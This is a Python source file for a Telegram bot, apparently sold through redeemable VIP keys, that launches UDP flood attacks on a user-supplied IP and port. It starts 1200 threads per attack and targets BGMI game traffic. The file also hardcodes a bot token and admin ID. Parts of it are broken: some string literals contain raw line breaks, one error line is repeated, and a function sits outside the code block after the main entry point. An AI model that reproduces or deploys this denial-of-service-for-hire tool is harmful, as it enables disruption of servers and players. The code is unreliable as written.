```python
#!/usr/bin/env python3
import os
import random
import string
import socket
import threading
import time
from datetime import datetime, timedelta
from telegram import Bot, Update, ChatPermissions
from telegram.ext import CommandHandler, Updater, CallbackContext, MessageHandler, Filters
import logging

# Configuration
USERS_FILE = "authorized_users.txt"
KEYS_FILE = "redeem_keys.txt"
GROUPS_FILE = "authorized_groups.txt"
TOKEN = "7750148888:AAGwyuOK4fkNvv4Mt6raIfc4bhn3_ssOXKY"
ADMIN_ID = "6957116305"
DEFAULT_THREADS = 1200
BGMI_PHOTO_REQUIRED = True
PHOTO_VERIFICATION_TIME = 240  # 4 minutes
BAN_DURATION = 900  # 15 minutes
BLOCKED_PORTS = {10000, 10001, 10002, 10003, 17500, 20001, 20002, 20003}
MAX_ATTACK_DURATION = 300  # Default maximum attack duration in seconds (5 minutes)

# Global variables
attack_end_time = None
attack_thread = None
attack_active = False
pending_verifications = {}  # {user_id: (start_time, message_id)}
user_attack_times = {}  # {user_id: (end_time, ip, port)}
authorized_groups = set()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Initialize Telegram Bot
bot = Bot(token=TOKEN)
updater = Updater(token=TOKEN, use_context=True)
dispatcher = updater.dispatcher

def load_groups():
    """Load authorized groups from file"""
    global authorized_groups
    if os.path.exists(GROUPS_FILE):
        with open(GROUPS_FILE, 'r') as f:
            authorized_groups = {line.strip() for line in f if line.strip()}

def is_admin(user_id):
    return str(user_id) == ADMIN_ID

def is_group_authorized(group_id):
    """Check if group is authorized"""
    return str(group_id) in authorized_groups

def is_authorized(user_id, chat_id=None):
    if is_admin(user_id):
        return True
        
    # Check individual user access
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            if str(user_id) in [line.strip() for line in f.readlines()]:
                return True
                
    # Check group access if chat_id is provided
    if chat_id and is_group_authorized(str(chat_id)):
        return True
        
    return False

def parse_duration(duration_str):
    try:
        if duration_str.endswith('h'):
            hours = int(duration_str[:-1])
            return timedelta(hours=hours)
        elif duration_str.endswith('d'):
            days = int(duration_str[:-1])
            return timedelta(days=days)
        else:
            days = int(duration_str)
            return timedelta(days=days)
    except ValueError:
        return None

def generate_key():
    chars = string.ascii_uppercase + string.digits
    return f"VIP-{''.join(random.SystemRandom().choice(chars) for _ in range(12))}"

def start(update: Update, context: CallbackContext):
    update.message.reply_text(
        "🎮 BGMI Attack Bot 🎮\n\n"
        "Type /help to see all commands"
    )

def help_command(update: Update, context: CallbackContext):
    help_text = """
🛠️ *BGMI Attack Bot Help* 🛠️

*Basic Commands:*
/start - Show welcome message
/help - Show this help message
/owner - Show creator information

*Key Management:*
/redeemkey <key> - Redeem your access key
/check - Check attack status
/mytime - Check your remaining attack time

*User Commands:*
/bgmi <IP> <PORT> <TIME> - Start BGMI attack (1200 threads)

*Admin Commands:*
/genkey <duration> [amount] - Generate keys (e.g. 1h, 3d)
/adduser <user_id> - Add authorized user
/removeuser <user_id> - Remove user
/listusers - List all authorized users
/setmaxd <seconds> - Set max attack duration
/addgroup <group_id> - Authorize a group (Admin only)
/removegroup <group_id> - Remove group (Admin only)
/listgroups - List authorized groups

*Current Limits:*
• Max Attack Duration: {} seconds
• Default Threads: {}

*Examples:*
/redeemkey VIP-ABC123XYZ
/bgmi 192.168.1.1 80 60
/setmaxd 300
/genkey 1d 5
""".format(MAX_ATTACK_DURATION, DEFAULT_THREADS)
    update.message.reply_text(help_text, parse_mode='Markdown')

def owner_info(update: Update, context: CallbackContext):
    update.message.reply_text(
        "👨‍💻 Creator: Vikku Bhai\n"
        "🔧 Version: 2.6\n"
        "📧 Contact: @vikku_bhai"
    )

def gen_key(update: Update, context: CallbackContext):
    if not is_admin(update.message.from_user.id):
        update.message.reply_text("🚫 Administrator privileges required")
        return

    args = context.args
    if not args:
        update.message.reply_text(
            "Usage: /genkey <duration> [amount]\n\n"
            "Examples:\n"
            "/genkey 1h 5 - 5 keys for 1 hour\n"
            "/genkey 3d - 1 key for 3 days"
        )
        return

    duration = parse_duration(args[0])
    if not duration:
        update.message.reply_text("❌ Invalid duration. Use like: 1h, 2d, 7")
        return

    amount = 1
    if len(args) > 1:
        try:
            amount = int(args[1])
            if amount < 1 or amount > 50:
                update.message.reply_text("❌ Amount must be 1-50")
                return
        except ValueError:
            update.message.reply_text("❌ Invalid amount")
            return

    expires = datetime.now() + duration
    generated_keys = []
    
    for _ in range(amount):
        key = generate_key()
        generated_keys.append(f"{key}|{expires.strftime('%Y-%m-%d %H:%M')}")

    with open(KEYS_FILE, 'a') as f:
        f.write('\n'.join(generated_keys) + '\n')

    duration_str = args[0] + (' hour(s)' if 'h' in args[0] else ' day(s)')
    update.message.reply_text(f"✅ Generated {amount} keys valid for {duration_str}")
    
    key_list = "\n".join([f"• {key.split('|')[0]}" for key in generated_keys])
    bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🔑 New Keys ({duration_str}):\n\n{key_list}\n\n"
             f"Expires: {expires.strftime('%Y-%m-%d %H:%M')}"
    )

def redeem_key(update: Update, context: CallbackContext):
    if len(context.args) != 1:
        update.message.reply_text("Usage: /redeemkey <key>")
        return

    user_id = str(update.message.from_user.id)
    input_key = context.args[0].strip()

    if os.path.exists(USERS_FILE) and user_id in open(USERS_FILE).read():
        update.message.reply_text("ℹ️ You already have access")
        return

    valid_keys = []
    key_found = False
    
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, 'r') as f:
            for line in f:
                if line.strip() and input_key in line:
                    key_found = True
                    key, expires = line.strip().split('|')
                    if datetime.now() > datetime.strptime(expires, '%Y-%m-%d %H:%M'):
                        update.message.reply_text("❌ Key has expired")
                        valid_keys.append(line.strip())
                        continue
                    update.message.reply_text(f"✅ Key redeemed! Expires: {expires}")
                else:
                    valid_keys.append(line.strip())

    if key_found:
        with open(KEYS_FILE, 'w') as f:
            f.write('\n'.join(valid_keys))
        with open(USERS_FILE, 'a') as f:
            f.write(f"{user_id}\n")
    else:
        update.message.reply_text("❌ Invalid key")

def check_attack(update: Update, context: CallbackContext):
    global attack_end_time
    
    if attack_end_time is None:
        update.message.reply_text("ℹ️ No active attack")
        return
    
    remaining = attack_end_time - time.time()
    if remaining <= 0:
        update.message.reply_text("✅ Attack completed")
        attack_end_time = None
    else:
        update.message.reply_text(f"⏳ Time remaining: {str(timedelta(seconds=int(remaining)))}")

def bgmi_attack(update: Update, context: CallbackContext):
    global attack_active, user_attack_times
    
    user_id = str(update.message.from_user.id)
    user_name = update.message.from_user.full_name
    chat_id = update.message.chat_id
    
    if not is_authorized(user_id, chat_id):
        update.message.reply_text(
            "🔒 Access Denied\n\n"
            "You need to:\n"
            "1. Redeem a valid key with /redeemkey\n"
            "2. Or be in an authorized group\n"
            "3. Or contact admin for access"
        )
        return
    
    if attack_active:
        update.message.reply_text("⚠️ Another attack is already running. Please wait.")
        return
    
    if len(context.args) != 3:
        update.message.reply_text("Usage: /bgmi <IP> <PORT> <TIME>")
        return
    
    try:
        ip = context.args[0]
        port = int(context.args[1])
        duration = int(context.args[2])
        
        if duration <= 0:
            update.message.reply_text("❌ Time must be positive")
            return
            
        if duration > MAX_ATTACK_DURATION:
            update.message.reply_text(f"❌ Maximum allowed duration is {MAX_ATTACK_DURATION} seconds")
            return
            
        if port in BLOCKED_PORTS:
            update.message.reply_text(f"❌ Port {port} is blocked for attacks")
            return
            
        global attack_thread
        attack_active = True
        user_attack_times[user_id] = (time.time() + duration, ip, port)
        
        if update.message.text.startswith("/spam"):
            logging.info(f"Attack started by {user_name}: ./spam {ip} {port} {duration}")

        attack_thread = threading.Thread(target=run_attack, args=(ip, port, duration, update))
        attack_thread.start()
        
        update.message.reply_text(
            f"🚀 *Attack Started* 🚀\n\n"
            f"• Target IP: `{ip}`\n"
            f"• Port: `{port}`\n"
            f"• Duration: `{duration}` seconds\n"
            f"• Max Allowed: `{MAX_ATTACK_DURATION}` seconds\n"
            f"• Threads: `{DEFAULT_THREADS}`\n"
            f"• Attacker: `{user_name}`\n"
            f"• Start Time: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\n"
            f"Use /mytime to check your remaining attack time",
            parse_mode='Markdown'
        )

    except ValueError:
        update.message.reply_text("❌ Invalid port/time")
        attack_active = False

def my_time(update: Update, context: CallbackContext):
    user_id = str(update.message.from_user.id)
    
    if user_id not in user_attack_times:
        update.message.reply_text("ℹ️ You don't have any active attacks")
        return
    
    end_time, ip, port = user_attack_times[user_id]
    remaining = max(0, end_time - time.time())
    
    if remaining <= 0:
        update.message.reply_text("✅ Your attack has completed")
        del user_attack_times[user_id]
    else:
        update.message.reply_text(
            f"⏳ Your attack status:\n\n"
            f"• Target: `{ip}:{port}`\n"
            f"• Time remaining: `{int(remaining)}` seconds\n"
            f"• Will complete at: `{datetime.fromtimestamp(end_time).strftime('%Y-%m-%d %H:%M:%S')}`",
            parse_mode='Markdown'
        )

def run_attack(ip, port, duration, update):
    global attack_end_time, attack_active, user_attack_times
    attack_end_time = time.time() + duration
    chat_id = update.message.chat_id
    user_id = str(update.message.from_user.id)
    
    try:
        threads = []
        for _ in range(DEFAULT_THREADS):
            t = threading.Thread(target=attack_thread_worker, args=(ip, port, duration))
            t.daemon = True
            threads.append(t)
            t.start()
        
        while time.time() < attack_end_time:
            time.sleep(1)
        
        # After attack completes
        if user_id in user_attack_times:
            del user_attack_times[user_id]
        
        bot.send_message(
            chat_id=chat_id,
            text="✅ Attack completed! Send a BGMI photo to continue"
        )
        
        # Request photo verification
        msg = bot.send_message(
            chat_id=chat_id,
            text="📸 Send any BGMI screenshot now (no text required)"
        )
        
        pending_verifications[user_id] = (time.time(), msg.message_id)
        threading.Thread(target=check_verification, args=(user_id, chat_id)).start()
        
    except Exception as e:
        bot.send_message(chat_id=chat_id, text=f"❌ Error: {e}")
    finally:
        attack_active = False

def attack_thread_worker(ip, port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b'BGMI_Attack_Packet', (ip, port))
            s.close()
            time.sleep(0.1)
        except:
            pass

def handle_photo(update: Update, context: CallbackContext):
    user_id = str(update.message.from_user.id)
    if user_id in pending_verifications:
        # Accept any photo as verification
        update.message.reply_text(
            "✅ BGMI photo accepted!",
            reply_to_message_id=update.message.message_id
        )
        del pending_verifications[user_id]

def check_verification(user_id, chat_id):
    time.sleep(PHOTO_VERIFICATION_TIME)
    if user_id in pending_verifications:
        # Ban user if no photo
        bot.restrict_chat_member(
            chat_id=chat_id,
            user_id=int(user_id),
            until_date=int(time.time()) + BAN_DURATION,
            permissions=ChatPermissions(can_send_messages=False)
        )
        bot.send_message(
            chat_id=chat_id,
            text=f"⛔ User banned for 15 minutes - No BGMI photo received"
        )
        del pending_verifications[user_id]

def add_user(update: Update, context: CallbackContext):
    if not is_admin(update.message.from_user.id):
        update.message.reply_text("🚫 Administrator privileges required")
        return

    if not context.args:
        update.message.reply_text("Usage: /adduser <telegram_user_id>")
        return

    user_id = context.args[0].strip()
    
    # Validate user ID is numeric
    if not user_id.isdigit():
        update.message.reply_text("❌ Invalid user ID. Must be numeric.")
        return

    # Check if user already exists
    if is_authorized(user_id):
        update.message.reply_text("ℹ️ User already has access")
        return

    # Add user to file
    with open(USERS_FILE, 'a') as f:
        f.write(f"{user_id}\n")

    update.message.reply_text(f"✅ User {user_id} added successfully")
    
    # Notify admin
    bot.send_message(
        chat_id=ADMIN_ID,
        text=f"👤 User Added:\n\nID: {user_id}\nBy: @{update.message.from_user.username}"
    )

def remove_user(update: Update, context: CallbackContext):
    if not is_admin(update.message.from_user.id):
        update.message.reply_text("🚫 Administrator privileges required")
        return

    if not context.args:
        update.message.reply_text("Usage: /removeuser <telegram_user_id>")
        return

    user_id = context.args[0].strip()
    
    # Validate user ID is numeric
    if not user_id.isdigit():
        update.message.reply_text("❌ Invalid user ID. Must be numeric.")
        return

    # Check if file exists
    if not os.path.exists(USERS_FILE):
        update.message.reply_text("ℹ️ No authorized users exist")
        return

    # Remove user from file
    with open(USERS_FILE, 'r') as f:
        users = [line.strip() for line in f.readlines() if line.strip() != user_id]

    with open(USERS_FILE, 'w') as f:
        f.write('\n'.join(users) + '\n')

    update.message.reply_text(f"✅ User {user_id} removed successfully")
    
    # Notify admin
    bot.send_message(
        chat_id=ADMIN_ID,
        text=f"👤 User Removed:\n\nID: {user_id}\nBy: @{update.message.from_user.username}"
    )

def list_users(update: Update, context: CallbackContext):
    if not is_admin(update.message.from_user.id):
        update.message.reply_text("🚫 Administrator privileges required")
        return

    if not os.path.exists(USERS_FILE):
        update.message.reply_text("ℹ️ No authorized users exist")
        return

    with open(USERS_FILE, 'r') as f:
        users = [line.strip() for line in f.readlines() if line.strip()]

    if not users:
        update.message.reply_text("ℹ️ No authorized users exist")
        return

    user_list = "\n".join([f"• {user_id}" for user_id in users])
    update.message.reply_text(f"👥 Authorized Users ({len(users)}):\n\n{user_list}")

def addgroup_command(update: Update, context: CallbackContext):
    """Strict admin-only group authorization"""
    user = update.message.from_user
    if not is_admin(user.id):
        update.message.reply_text("🚫 This command requires administrator privileges")
        return

    if not context.args:
        update.message.reply_text(
            "🔐 *Admin Command* 🔐\n"
            "Usage: /addgroup <group_id>\n"
            "Example: /addgroup -100123456789\n\n"
            f"Current authorized groups: {len(authorized_groups)}",
            parse_mode='Markdown'
        )
        return

    group_id = context.args[0].strip()
    
    # Strict validation
    if not (group_id.startswith('-100') and group_id[1:].isdigit()):
        update.message.reply_text("❌ Invalid Telegram group ID format")
        return
        
    if is_group_authorized(group_id):
        update.message.reply_text("⚠️ Group is already authorized")
        return

    # Update in memory and file
    authorized_groups.add(group_id)
    with open(GROUPS_FILE, 'a') as f:
        f.write(f"{group_id}\n")

    # Secure confirmation
    update.message.reply_text(
        f"✅ *Group Authorization Added*\n"
        f"Group ID: `{group_id}`\n"
        f"By Admin: @{user.username}",
        parse_mode='Markdown'
    )
    
    # Admin audit log
    bot.send_message(
        chat_id=ADMIN_ID,
        text=f"📝 ADMIN ACTION: GROUP ADDED\n"
             f"Group: {group_id}\n"
             f"By: @{user.username}\n"
             f"At: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode='Markdown'
    )

def removegroup_command(update: Update, context: CallbackContext):
    """Strict admin-only group deauthorization"""
    user = update.message.from_user
    if not is_admin(user.id):
        update.message.reply_text("🚫 This command requires administrator privileges")
        return

    if not context.args:
        update.message.reply_text(
            "🔐 *Admin Command* 🔐\n"
            "Usage: /removegroup <group_id>\n"
            "Example: /removegroup -100123456789\n\n"
            f"Current authorized groups: {len(authorized_groups)}",
            parse_mode='Markdown'
        )
        return

    group_id = context.args[0].strip()
    
    if not is_group_authorized(group_id):
        update.message.reply_text("⚠️ Group is not in authorized list")
        return

    # Update in memory and file
    authorized_groups.discard(group_id)
    with open(GROUPS_FILE, 'w') as f:
        f.write('\n'.join(authorized_groups) + '\n')

    # Secure confirmation
    update.message.reply_text(
        f"✅ *Group Authorization Removed*\n"
        f"Group ID: `{group_id}`\n"
        f"By Admin: @{user.username}",
        parse_mode='Markdown'
    )
    
    # Admin audit log
    bot.send_message(
        chat_id=ADMIN_ID,
        text=f"📝 ADMIN ACTION: GROUP REMOVED\n"
             f"Group: {group_id}\n"
             f"By: @{user.username}\n"
             f"At: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode='Markdown'
    )

def listgroups_command(update: Update, context: CallbackContext):
    """List all authorized groups (Admin only)"""
    if not is_admin(update.message.from_user.id):
        update.message.reply_text("🚫 Administrator privileges required")
        return

    if not authorized_groups:
        update.message.reply_text("ℹ️ No authorized groups")
        return

    group_list = "\n".join(f"• {g}" for g in authorized_groups)
    update.message.reply_text(f"👥 Authorized Groups ({len(authorized_groups)}):\n\n{group_list}")



def set_max_duration(update: Update, context: CallbackContext):
    global MAX_ATTACK_DURATION

    if not is_admin(update.message.from_user.id):
        update.message.reply_text("🚫 Administrator privileges required")
        return

    if not context.args:
        update.message.reply_text(
            "Usage: /setmaxd <seconds>
Current max duration: {} seconds".format(MAX_ATTACK_DURATION)
        )
        return

    try:
        new_duration = int(context.args[0])
        if new_duration < 60:
            update.message.reply_text("❌ Minimum duration is 60 seconds")
            return
        if new_duration > 86400:
            update.message.reply_text("❌ Maximum duration is 86400 seconds (24 hours)")
            return

        MAX_ATTACK_DURATION = new_duration
        update.message.reply_text(
            "✅ Maximum attack duration set to {} seconds ({})".format(
                new_duration, timedelta(seconds=new_duration)
            )
        )

        bot.send_message(
            chat_id=ADMIN_ID,
            text="⚙️ Max Duration Changed:
"
                 "New: {} seconds
"
                 "By: @{}
"
                 "At: {}".format(
                     new_duration,
                     update.message.from_user.username,
                     datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                 )
        )
    except ValueError:
        update.message.reply_text("❌ Invalid duration. Please enter a number")

        update.message.reply_text("❌ Invalid duration. Please enter a number")
        update.message.reply_text("❌ Invalid duration. Please enter a number")

def main():
    # Load groups at startup
    load_groups()
    
    # Initialize files
    for file in [USERS_FILE, KEYS_FILE, GROUPS_FILE]:
        if not os.path.exists(file):
            open(file, 'w').close()

    # Add command handlers
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("help", help_command))
    dispatcher.add_handler(CommandHandler("owner", owner_info))
    dispatcher.add_handler(CommandHandler("genkey", gen_key))
    dispatcher.add_handler(CommandHandler("redeemkey", redeem_key))
    dispatcher.add_handler(CommandHandler("check", check_attack))
    dispatcher.add_handler(CommandHandler("bgmi", bgmi_attack))
    dispatcher.add_handler(CommandHandler("spam", spam_attack))
    dispatcher.add_handler(CommandHandler("mytime", my_time))
    dispatcher.add_handler(CommandHandler("adduser", add_user))
    dispatcher.add_handler(CommandHandler("removeuser", remove_user))
    dispatcher.add_handler(CommandHandler("listusers", list_users))
    dispatcher.add_handler(CommandHandler("setmaxd", set_max_duration))
    dispatcher.add_handler(CommandHandler("addgroup", addgroup_command))
    dispatcher.add_handler(CommandHandler("removegroup", removegroup_command))
    dispatcher.add_handler(CommandHandler("listgroups", listgroups_command))
    dispatcher.add_handler(MessageHandler(Filters.photo, handle_photo))
    
    # Start the bot
    print("Bot is running...")
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
```

def spam_attack(update: Update, context: CallbackContext):
    # Reuse the bgmi_attack logic
    return bgmi_attack(update, context)
